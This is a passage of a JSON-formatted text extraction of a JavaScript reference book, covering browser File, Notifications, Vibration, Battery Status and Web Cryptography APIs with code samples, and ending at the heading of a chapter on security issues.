        "text": "document. getElementById ( 'upload' ) . addEventListener ( 'change' ,  showImage ); function  showImage ( evt )   {      var  files  =  evt. target . files ;      if   ( files. length   ===   0 )   {         console. log ( 'No files selected' );          return ;      }      var  reader  =   new  FileReader ();     reader. onload   =   function ( event )   {          var  img  =   new  Image ();         img. onload   =   function ()   {             document. body . appendChild ( img );          };         img. src   =  event. target . result ;      };     reader. readAsDataURL ( files [ 0 ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 89.3: Slice a \ufb01le",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  blob. slice ()  method is used to create a new Blob object containing the data in the speci\ufb01ed range of bytes of the source Blob. This method is usable with File instances too, since File extends Blob. Here we slice a \ufb01le in a speci\ufb01c amount of blobs. This is useful especially in cases where you need to process \ufb01les that are too large to read in memory all in once. We can then read the chunks one by one using  FileReader . /**",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "* @param {File|Blob} - file to slice * @param {Number} - chunksAmount * @return {Array} - an array of Blobs **/",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  sliceFile ( file ,  chunksAmount )   {    var  byteIndex  =   0 ;    var  chunks  =   [];        for   ( var  i  =   0 ;  i  <  chunksAmount ;  i  +=   1 )   {      var  byteEnd  =  Math. ceil (( file. size   /  chunksAmount )   *   ( i  +   1 ));     chunks. push ( file. slice ( byteIndex ,  byteEnd ));     byteIndex  +=   ( byteEnd  -  byteIndex );    }    return  chunks ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 89.4: Get the properties of the \ufb01le",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you want to get the properties of the \ufb01le (like the name or the size) you can do it before using the File Reader. If we have the following html piece of code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"   id = \"newFile\" >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can access the properties directly like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( 'newFile' ) . addEventListener ( 'change' ,  getFile );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 410",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getFile ( event )   {      var  files  =  event. target . files          ,  file  =  files [ 0 ];     console. log ( 'Name of the file' ,  file. name );     console. log ( 'Size of the file' ,  file. size ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also get easily the following attributes:  lastModified  (Timestamp),  lastModifiedDate  (Date), and  type  (File Type)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.5: Selecting multiple \ufb01les and restricting \ufb01le types",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The HTML5 \ufb01le API allows you to restrict which kind of \ufb01les are accepted by simply setting the accept attribute on a \ufb01le input, e.g.:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"   accept = \"image/jpeg\" >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Specifying multiple MIME types separated by a comma (e.g.  image / jpeg , image / png ) or using wildcards (e.g. image /*  for allowing all types of images) give you a quick and powerful way to restrict the type of \ufb01les you want to select. Here's an example for allowing any image or video:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"   accept = \"image/*,video*\" >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By default, the \ufb01le input lets the user select a single \ufb01le. If you want to enable multiple \ufb01le selection, simply add the multiple  attribute:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"  multiple >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can then read all the selected \ufb01les via the \ufb01le input's  files  array. See read \ufb01le as dataUrl",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.6: Client side csv download using Blob",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  downloadCsv ()   {    var  blob  =   new  Blob ([ csvString ]);    if   ( window. navigator . msSaveOrOpenBlob ){     window. navigator . msSaveBlob ( blob ,   \"filename.csv\" );    }    else   {      var  a  =  window. document . createElement ( \"a\" );     a. href   =  window. URL . createObjectURL ( blob ,   {       type :   \"text/plain\"      });     a. download   =   \"filename.csv\" ;     document. body . appendChild ( a );     a. click ();     document. body . removeChild ( a );    } } var  string  =   \"a1,a2,a3\" ; downloadCSV ( string );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Source reference ;  https://github.com/mholt/PapaParse/issues/175",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 411",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 90: Noti\ufb01cations API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 90.1: Requesting Permission to send noti\ufb01cations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We use  Notification. requestPermission  to ask the user if he/she wants to receive noti\ufb01cations from our website.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Notification. requestPermission ( function ()   {      if   ( Notification. permission   ===   'granted' )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // user approved.          // use of new Notification(...) syntax will now be successful",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }   else   if   ( Notification. permission   ===   'denied' )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // user denied.      }   else   {   // Notification.permission === 'default'          // user didn \u2019 t make a decision.          // You can \u2019 t send notifications until they grant permission.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Since Firefox 47 The  . requestPermission  method can also return a promise when handling the user's decision for granting permission",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Notification. requestPermission () . then ( function ( permission )   {      if   (!( 'permission'   in  Notification ))   {         Notification. permission   =  permission ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // you got permission !",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     },   function ( rejection )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // handle rejection here.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 90.2: Sending Noti\ufb01cations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "After the user has approved a request for permission to send noti\ufb01cations, we can send a simple noti\ufb01cation that says Hello to the user:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "new  Notification ( 'Hello' ,   {  body :   'Hello, world!' ,  icon :   'url to an .ico image'   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will send a noti\ufb01cation like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hello",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hello, world!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.3: Closing a noti\ufb01cation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can close a noti\ufb01cation by using the  . close ()  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  notification  =   new  Notification ( title ,  options );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// do some work, then close the notification",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "notification. close ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can utilize the  setTimeout  function to auto-close the noti\ufb01cation sometime in the future.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 412",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  notification  =   new  Notification ( title ,  options ); setTimeout (()   =>   {     notification. close () },   4000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above code will spawn a noti\ufb01cation and close it after 4 seconds.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.4: Noti\ufb01cation events",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Noti\ufb01cation API speci\ufb01cations support 2 events that can be \ufb01red by a Noti\ufb01cation. The  click  event. 1. This event will run when you click on the noti\ufb01cation body (excluding the closing X and the Noti\ufb01cations con\ufb01guration button). Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "notification. onclick   =   function ( event )   {     console. debug ( \"you click me and this is my event object: \" ,  event ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  error  event 2. The noti\ufb01cation will \ufb01re this event whenever something wrong will happen, like being unable to display",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "notification. onerror   =   function ( event )   {     console. debug ( \"There was an error: \" ,  event ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 413",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 91: Vibration API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Modern mobile devices include hardware for vibrations. The Vibration API o\ufb00ers Web apps the ability to access this hardware, if it exists, and does nothing if the device doesn't support it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 91.1: Single vibration",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Vibrate the device for 100ms:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. navigator . vibrate ( 100 ); or window. navigator . vibrate ([ 100 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 91.2: Check for support",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Check if browser supports vibrations",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( 'vibrate'   in  window. navigator )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // browser has support for vibrations else      // no support",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 91.3: Vibration patterns",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "An array of values describes periods of time in which the device is vibrating and not vibrating.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. navigator . vibrate ([ 200 ,   100 ,   200 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 92: Battery Status API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 92.1: Battery Events",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Get the battery API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "navigator. getBattery () . then ( function ( battery )   {     battery. addEventListener ( 'chargingchange' ,   function (){         console. log (   'New charging state: ' ,  battery. charging   );      });     battery. addEventListener ( 'levelchange' ,   function (){         console. log (   'New battery level: ' ,  battery. level   *   100   +   \"%\"   );      });     battery. addEventListener ( 'chargingtimechange' ,   function (){         console. log (   'New time left until full: ' ,  battery. chargingTime ,   \" seconds\"   );      });     battery. addEventListener ( 'dischargingtimechange' ,   function (){         console. log (   'New time left until empty: ' ,  battery. dischargingTime ,   \" seconds\"   );      }); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 92.2: Getting current battery level",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Get the battery API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "navigator. getBattery () . then ( function ( battery )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Battery level is between 0 and 1, so we multiply it by 100 to get in percents",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"Battery level: \"   +  battery. level   *   100   +   \"%\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 92.3: Is battery charging?",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Get the battery API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "navigator. getBattery () . then ( function ( battery )   {      if   ( battery. charging )   {         console. log ( \"Battery is charging\" );      }   else   {         console. log ( \"Battery is discharging\" );      } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 92.4: Get time left until battery is empty",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Get the battery API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "navigator. getBattery () . then ( function ( battery )   {     console. log (   \"Battery will drain in \" ,  battery. dischargingTime ,   \" seconds\"   ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 92.5: Get time left until battery is fully charged",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Get the battery API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "navigator. getBattery () . then ( function ( battery )   {     console. log (   \"Battery will get fully charged in \" ,  battery. chargingTime ,   \" seconds\"   ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 415",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 93: Fluent API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "JavaScript is great for designing \ufb02uent API - a consumer-oriented API with focus on developer experience. Combine with language dynamic features for optimal results.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 93.1: Fluent API capturing construction of HTML articles with JS",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "class  Item  {     constructor ( text ,  type )   {             this . text   =  text ;          this . emphasis   =   false ;          this . type   =  type ;      }     toHtml ()   {          return  ` < $ { this . type }> $ { this . emphasis   ?   '<em>'   :   '' } $ { this . text } $ { this . emphasis   ?   '</em>'   : '' }</ $ { this . type }> ` ;      } } class  Section  {     constructor ( header ,  paragraphs )   {          this . header   =  header ;          this . paragraphs   =  paragraphs ;      }         toHtml ()   {          return  ` < section >< h2 > $ { this . header }</ h2 > $ { this . paragraphs . map ( p  => p. toHtml ()) . join ( '' )}</ section > ` ;      } } class  List  {     constructor ( text ,  items )   {          this . text   =  text ;          this . items   =  items ;      }         toHtml ()   {          return  ` < ol >< h2 > $ { this . text }</ h2 > $ { this . items . map ( i  =>  i. toHtml ()) . join ( '' )}</ ol > ` ;      } } class  Article  {     constructor ( topic )   {          this . topic   =  topic ;          this . sections   =   [];          this . lists   =   [];      }     section ( text )   {          const  section  =   new  Section ( text ,   []);          this . sections . push ( section );          this . lastSection   =  section ;          return   this ;      }    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 416",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    list ( text )   {          const  list  =   new  List ( text ,   []);          this . lists . push ( list );          this . lastList   =  list ;          return   this ;      }     addParagraph ( text )   {          const  paragraph  =   new  Item ( text ,   'p' );          this . lastSection . paragraphs . push ( paragraph );          this . lastItem   =  paragraph ;          return   this ;      }     addListItem ( text )   {          const  listItem  =   new  Item ( text ,   'li' );          this . lastList . items . push ( listItem );          this . lastItem   =  listItem ;          return   this ;      }     withEmphasis ()   {          this . lastItem . emphasis   =   true ;          return   this ;      }         toHtml ()   {          return  ` < article >< h1 > $ { this . topic }</ h1 > $ { this . sections . map ( s  => s. toHtml ()) . join ( '' )} $ { this . lists . map ( l  =>  l. toHtml ()) . join ( '' )}</ article > ` ;      } } Article. withTopic   =  topic  =>   new  Article ( topic );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This allows the consumer of the API to have a nice-looking article construction, almost a DSL for this purpose, using plain JS:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "const  articles  =   [     Article. withTopic ( 'Artificial Intelligence - Overview' )       . section ( 'What is Artificial Intelligence?' )         . addParagraph ( 'Something something' )         . addParagraph ( 'Lorem ipsum' )           . withEmphasis ()       . section ( 'Philosophy of AI' )           . addParagraph ( 'Something about AI philosophy' )           . addParagraph ( 'Conclusion' ),           Article. withTopic ( 'JavaScript' )       . list ( 'JavaScript is one of the 3 languages all web developers must learn:' )           . addListItem ( 'HTML to define the content of web pages' )           . addListItem ( 'CSS to specify the layout of web pages' )           . addListItem ( ' JavaScript to program the behavior of web pages' ) ]; document. getElementById ( 'content' ) . innerHTML   =  articles. map ( a  =>  a. toHtml ()) . join ( ' \\n ' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 417",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 94: Web Cryptography API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 94.1: Creating digests (e.g. SHA-256)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Convert string to ArrayBuffer. This step is only necessary if you wish to hash a string, not if you already got an ArrayBuffer such as an Uint8Array.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  input  =   new  TextEncoder ( 'utf-8' ) . encode ( 'Hello world!' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Calculate the SHA-256 digest",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "crypto. subtle . digest ( 'SHA-256' ,  input )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Wait for completion",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ". then ( function ( digest )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // digest is an ArrayBuffer. There are multiple ways to proceed.    // If you want to display the digest as a hexadecimal string, this will work:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  view  =   new  DataView ( digest );    var  hexstr  =   '' ;    for ( var  i  =   0 ;  i  <  view. byteLength ;  i ++)   {      var  b  =  view. getUint8 ( i );     hexstr  +=   '0123456789abcdef' [( b  &  0xf0 )   >>   4 ];     hexstr  +=   '0123456789abcdef' [( b  &  0x0f )];    }   console. log ( hexstr );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Otherwise, you can simply create an Uint8Array from the buffer:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  digestAsArray  =   new  Uint8Array ( digest );   console. log ( digestAsArray ); })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Catch errors",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": ". catch ( function ( err )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. error ( err ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The current draft suggests to provide at least  SHA - 1 ,  SHA - 256 ,  SHA - 384  and  SHA - 512 , but this is no strict requirement and subject to change. However, the SHA family can still be considered a good choice as it will likely be supported in all major browsers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.2: Cryptographically random data",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Create an array with a fixed size and type.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  array  =   new  Uint8Array ( 5 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Generate cryptographically random values",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "crypto. getRandomValues ( array );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Print the array to the console",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( array );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "crypto. getRandomValues ( array )  can be used with instances of the following classes (described further in Binary Data) and will generate values from the given ranges (both ends inclusive): Int8Array : -27 to 27-1 Uint8Array : 0 to 28-1 Int16Array : -215 to 215-1 Uint16Array : 0 to 216-1 Int32Array : -231 to 231-1 Uint32Array : 0 to 231-1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 418",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.3: Generating RSA key pair and converting to PEM format",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In this example you will learn how to generate RSA-OAEP key pair and how to convert private key from this key pair to base64 so you can use it with OpenSSL etc. Please note that this process can also be used for public key you just have to use pre\ufb01x and su\ufb03x below:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "----- BEGIN PUBLIC KEY ----- ----- END PUBLIC KEY -----",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NOTE: This example is fully tested in these browsers: Chrome, Firefox, Opera, Vivaldi",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  arrayBufferToBase64 ( arrayBuffer )   {      var  byteArray  =   new  Uint8Array ( arrayBuffer );      var  byteString  =   '' ;      for ( var  i = 0 ;  i  <  byteArray. byteLength ;  i ++)   {         byteString  +=  String. fromCharCode ( byteArray [ i ]);      }      var  b64  =  window. btoa ( byteString );      return  b64 ; } function  addNewLines ( str )   {      var  finalString  =   '' ;     while ( str. length   >   0 )   {         finalString  +=  str. substring ( 0 ,   64 )   +   ' \\n ' ;         str  =  str. substring ( 64 );      }      return  finalString ; } function  toPem ( privateKey )   {      var  b64  =  addNewLines ( arrayBufferToBase64 ( privateKey ));      var  pem  =   \"-----BEGIN PRIVATE KEY----- \\n \"   +  b64  +   \"-----END PRIVATE KEY-----\" ;          return  pem ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Let's generate the key pair first",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. crypto . subtle . generateKey (      {         name :   \"RSA-OAEP\" ,         modulusLength :   2048 ,   // can be 1024, 2048 or 4096         publicExponent :   new  Uint8Array ([ 0x01 ,  0x00 ,  0x01 ]),         hash :   { name :   \"SHA-256\" }   // or SHA-512      },      true ,      [ \"encrypt\" ,   \"decrypt\" ] ) . then ( function ( keyPair )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     /* now when the key pair is generated we are going        to export it from the keypair object in pkcs8     */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    window. crypto . subtle . exportKey (          \"pkcs8\" ,         keyPair. privateKey      ) . then ( function ( exportedPrivateKey )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // converting exported private key to PEM format",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  pem  =  toPem ( exportedPrivateKey );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 419",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "        console. log ( pem );      }) . catch ( function ( err )   {         console. log ( err );      }); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That's it! Now you have a fully working and compatible RSA-OAEP Private Key in PEM format which you can use wherever you want. Enjoy!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.4: Converting PEM key pair to CryptoKey",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "So, have you ever wondered how to use your PEM RSA key pair that was generated by OpenSSL in Web Cryptography API? If the answers is yes. Great! You are going to \ufb01nd out. NOTE: This process can also be used for public key, you only need to change pre\ufb01x and su\ufb03x to:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "-----BEGIN PUBLIC KEY----- -----END PUBLIC KEY-----",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This example assumes that you have your RSA key pair generated in PEM.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  removeLines ( str )   {      return  str. replace ( \" \\n \" ,   \"\" ); } function  base64ToArrayBuffer ( b64 )   {      var  byteString  =  window. atob ( b64 );      var  byteArray  =   new  Uint8Array ( byteString. length );      for ( var  i = 0 ;  i  <  byteString. length ;  i ++)   {         byteArray [ i ]   =  byteString. charCodeAt ( i );      }      return  byteArray ; } function  pemToArrayBuffer ( pem )   {      var  b64Lines  =  removeLines ( pem );      var  b64Prefix  =  b64Lines. replace ( '-----BEGIN PRIVATE KEY-----' ,   '' );      var  b64Final  =  b64Prefix. replace ( '-----END PRIVATE KEY-----' ,   '' );      return  base64ToArrayBuffer ( b64Final ); } window. crypto . subtle . importKey (      \"pkcs8\" ,     pemToArrayBuffer ( yourprivatekey ),      {         name :   \"RSA-OAEP\" ,         hash :   { name :   \"SHA-256\" }   // or SHA-512      },      true ,      [ \"decrypt\" ] ) . then ( function ( importedPrivateKey )   {     console. log ( importedPrivateKey );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}) . catch ( function ( err )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( err ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 420",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "And now you're done! You can use your imported key in WebCrypto API.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 421",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 95: Security issues",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "This is a collection of common JavaScript security issues, like XSS and eval injection. This collection also contains how to mitigate these security issues.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.1: Re\ufb02ected Cross-site scripting (XSS)",
